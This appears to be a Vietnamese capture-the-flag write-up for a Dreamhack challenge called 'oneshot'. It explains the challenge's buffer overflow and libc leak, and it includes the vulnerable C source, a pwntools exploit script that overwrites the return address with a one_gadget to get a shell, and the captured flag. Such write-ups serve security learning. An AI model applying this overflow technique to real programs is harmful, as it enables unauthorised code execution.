# Oneshot

bài này cái cơ bản và dễ

**source C:**
```c

// gcc -o oneshot1 oneshot1.c -fno-stack-protector -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if (check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}

```

bài này có lỗi BOF nè

chương trình cho ta địa chỉ stdout nên **ta dễ dàng leak được libc rồi**

như tên đề bài thì ta chỉ cần one_gadget là xong

![image](https://github.com/gookoosss/CTF/assets/128712571/1696b15e-3ffb-448d-bf51-e6cee5687756)


**chọn 0x45226**

lưu ý nhỏ là khi nhập payload là **tại rbp-0x8 sẽ so sánh với null , nếu ko phải sẽ out chương trình nên tại rbp-0x8 là sẽ nhập 8 byte null nha**

![image](https://github.com/gookoosss/CTF/assets/128712571/e49ca9b0-0e06-4dc5-a94d-f4b46bb8ef16)


## script:

```python

#!/usr/bin/env python3

from pwn import *

exe = ELF("./oneshot_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")
context.binary = exe
p = process([exe.path])
p = remote("host3.dreamhack.games", 14176)
        
p.recvuntil(b'stdout: ')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x3c5620
log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))

# gdb.attach(p, gdbscript = '''
# b*main+171
# c        
# ''')

# input()

one_gadget = libc.address + 0x45226

payload = b'a'*24
payload += b'\0'*8
payload += b'a'*8
payload += p64(one_gadget)
# payload += p64(one_gadget)
p.sendafter(b'MSG: ',payload)

p.interactive()

# DH{7caac677309f0c97f98cd088e4184671d434b376dd2504df8d6b7ae7da3fc8f5}


```

## Flag:


**DH{7caac677309f0c97f98cd088e4184671d434b376dd2504df8d6b7ae7da3fc8f5}**
